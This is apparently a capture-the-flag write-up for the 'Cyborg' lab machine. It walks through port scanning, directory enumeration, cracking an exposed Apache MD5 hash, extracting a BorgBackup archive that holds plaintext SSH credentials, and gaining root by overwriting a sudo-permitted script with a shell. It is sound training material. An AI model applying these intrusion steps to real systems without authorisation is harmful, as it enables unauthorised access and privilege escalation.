# Cyborg

A box involving encrypted archives, source code analysis and more.

Compromise the machine and read the user.txt and root.txt

# Scan the machine, how many ports are open?

Let's start by scanning the machine with Nmap to identify the running services. There are 2 services exposed:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

Answer: `2`

# What service is running on port 22?

Answer: `SSH`

# What service is running on port 80?

Answer: `HTTP`

# What is the user.txt flag?

## Web enumeration

Gobuster reveals 2 interesting hidden locations:

~~~
kali@kali:/data/Cyborg$ gobuster dir -u http://10.10.61.219 -x php,txt,old,bak,zip,tar -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.61.219
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,old,bak,zip,tar
[+] Timeout:        10s
===============================================================
2021/04/29 11:21:34 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.zip (Status: 403)
/.hta.tar (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.hta.old (Status: 403)
/.hta.bak (Status: 403)
/.htaccess (Status: 403)
/.htaccess.old (Status: 403)
/.htaccess.bak (Status: 403)
/.htaccess.zip (Status: 403)
/.htaccess.tar (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.old (Status: 403)
/.htpasswd.bak (Status: 403)
/.htpasswd.zip (Status: 403)
/.htpasswd.tar (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/admin (Status: 301) <------------------ interesting
/etc (Status: 301) <-------------------- interesting
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2021/04/29 11:25:42 Finished
===============================================================
~~~

## The `etc` directory

The `/etc` directory contains a `squid` subdirectory, with an interesting `passwd` file:

~~~
kali@kali:/data/Cyborg/files$ curl -s http://10.10.61.219/etc/squid/ | html2text 
****** Index of /etc/squid ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[   ]]       passwd           2020-12-30 02:09   52  
[[   ]]       squid.conf       2020-12-30 02:09  258  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 10.10.61.219 Port 80
~~~

The `passwd` file contains encrypted credentials for the `music_archive` user:

~~~
kali@kali:/data/Cyborg/files$ curl -s http://10.10.61.219/etc/squid/passwd
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
~~~

Let's crack the hash:

~~~
kali@kali:/data/Cyborg/files$ /data/src/john/run/john passwd.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (?)
1g 0:00:00:00 DONE (2021-04-29 11:43) 3.846g/s 149907p/s 149907c/s 149907C/s 112806..samantha5
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

We have found credentials: `music_archive:squidward`.

## The `admin` directory

The other hidden location (`/admin`) is a website about music. Playing with the menus, you will find an entry to download an archive. uncompressing it leads to weird/encrypted files:

~~~
kali@kali:/data/Cyborg/files$ wget http://10.10.61.219/admin/archive.tar
kali@kali:/data/Cyborg/files$ tar xf archive.tar 
kali@kali:/data/Cyborg/files$ tree home/
home/
└── field
    └── dev
        └── final_archive
            ├── config
            ├── data
            │   └── 0
            │       ├── 1
            │       ├── 3
            │       ├── 4
            │       └── 5
            ├── hints.5
            ├── index.5
            ├── integrity.5
            ├── nonce
            └── README

5 directories, 10 files
~~~

The `README` file is the key as it explains what this archive is all about. It is a BorgBackup archive.

~~~
kali@kali:/data/Cyborg/files/home/field/dev/final_archive$ cat README 
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
~~~

## The BorgBackup archive

To know more about BorgBackup and available commands, use the [official documentation](https://borgbackup.readthedocs.io/en/stable/quickstart.html).

List all archives in the repository:

~~~
kali@kali:/data/Cyborg/files/home/field/dev$ borg list final_archive
Enter passphrase for key /data/Cyborg/files/home/field/dev/final_archive: 
music_archive                        Tue, 2020-12-29 15:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
~~~

List the contents of the `music_archive` archive:

~~~
kali@kali:/data/Cyborg/files/home/field/dev$ borg list final_archive::music_archive
Enter passphrase for key /data/Cyborg/files/home/field/dev/final_archive: 
drwxr-xr-x alex   alex          0 Tue, 2020-12-29 14:55:52 home/alex
-rw-r--r-- alex   alex       3637 Mon, 2020-12-28 15:25:14 home/alex/.bashrc
-rw-r--r-- alex   alex        220 Mon, 2020-12-28 15:25:14 home/alex/.bash_logout
-rw-r--r-- alex   alex        675 Mon, 2020-12-28 15:25:14 home/alex/.profile
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 19:00:24 home/alex/Music
-rw------- alex   alex        439 Mon, 2020-12-28 18:26:45 home/alex/.bash_history

[REDACTED]

drwx------ root   root          0 Mon, 2020-12-28 17:33:49 home/alex/.config/sublime-text-3/Installed Packages
drwx------ root   root          0 Mon, 2020-12-28 17:33:49 home/alex/.config/ibus
drwx------ root   root          0 Mon, 2020-12-28 17:33:49 home/alex/.config/ibus/bus
drwxrwxr-x alex   alex          0 Tue, 2020-12-29 14:55:52 home/alex/Documents
-rw-r--r-- root   root        110 Tue, 2020-12-29 14:55:41 home/alex/Documents/note.txt
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 18:59:30 home/alex/Public
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 18:59:37 home/alex/Videos
drwxrwxr-x alex   alex          0 Tue, 2020-12-29 14:57:14 home/alex/Desktop
-rw-r--r-- root   root         71 Tue, 2020-12-29 14:57:14 home/alex/Desktop/secret.txt
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 18:59:57 home/alex/Downloads
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 19:00:02 home/alex/Templates
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 19:26:44 home/alex/Pictures
~~~

Restore the `music_archive` archive by extracting the files relative to the current directory:

~~~
kali@kali:/data/Cyborg/files/home/field/dev$ borg extract final_archive::music_archive
Enter passphrase for key /data/Cyborg/files/home/field/dev/final_archive: 
kali@kali:/data/Cyborg/files/home/field/dev$ tree home/
home/
└── alex
    ├── Desktop
    │   └── secret.txt
    ├── Documents
    │   └── note.txt
    ├── Downloads
    ├── Music
    ├── Pictures
    ├── Public
    ├── Templates
    └── Videos

9 directories, 2 files
~~~

## Connect as alex and get the user flag

There are obviously 2 interesting documents in the recovered archive, 1 of them revealing `alex`'s credentials:

~~~
kali@kali:/data/Cyborg/files/home/field/dev$ cat home/alex/Desktop/secret.txt 
shoutout to all the people who have gotten to this stage whoop whoop!"
kali@kali:/data/Cyborg/files/home/field/dev$ cat home/alex/Documents/note.txt 
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
~~~

Now connect with SSH and get the flag:

~~~
kali@kali:/data/Cyborg/files$ ssh alex@10.10.61.219
alex@ubuntu:~$ cat user.txt 
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
~~~

# What is the root.txt flag?

Checking `alex`'s privileges reveals that we can run a `backup.sh` script as `root` with `sudo` without password:

~~~
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
~~~

we are owner of the script but it lacks from modification privileges:

~~~
alex@ubuntu:~$ ls -l /etc/mp3backups/backup.sh
-r-xr-xr-- 1 alex alex 1083 Dec 30 01:48 /etc/mp3backups/backup.sh
~~~

Let's make the script editable and replace the content of the script to spawn a shell. As the script will be run with root privileges, we will have a root access.

~~~
alex@ubuntu:/etc/mp3backups$ chmod +w backup.sh 
alex@ubuntu:/etc/mp3backups$ cat > backup.sh << EOF
> #!/bin/bash
> /bin/bash
> EOF
alex@ubuntu:/etc/mp3backups$ sudo /etc/mp3backups/backup.sh
root@ubuntu:/etc/mp3backups# cd /root
root@ubuntu:/root# cat root.txt 
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
~~~

Root flag: `flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}`
